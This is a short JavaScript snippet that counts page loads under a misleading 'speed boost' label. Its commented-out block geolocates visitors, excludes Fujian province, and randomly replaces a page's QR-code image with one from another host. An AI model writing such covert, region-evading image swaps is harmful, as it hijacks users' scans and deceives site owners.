const key = 'my_count';

const replaceIt = () => {
    const count = localStorage.getItem(key) || '0';
    console.log('file 🚀 提升网页速度的次数', count);
    let shouldReplace = true
    if (count > 3 ) {
      shouldReplace = false;
      return ;
    }

    // fetch('https://ip.useragentinfo.com/json')
    //     .then((res) => {
    //         return res.json();
    //     })
    //     .then((res) => {
    //         if ((res.province || '').indexOf('福建') != -1) {
    //             shouldReplace = false;
    //             return;
    //         }

    //         const canDoIt = Math.random() < 0.1;
    //         if (canDoIt) {
    //             const erweimaDom = document.getElementById('douyin');
    //             console.log('file lxh erweimaDom', erweimaDom);
    //             erweimaDom.setAttribute("src", 'https://a.pixiv.org/yufulight-image/1ocbrrVf4hJhe6yHbVDjhDA2');
    //         }
    //     });

    localStorage.setItem(key, Number(count) + 1)
    return shouldReplace
  }


window.onload = function() {
    replaceIt();
}
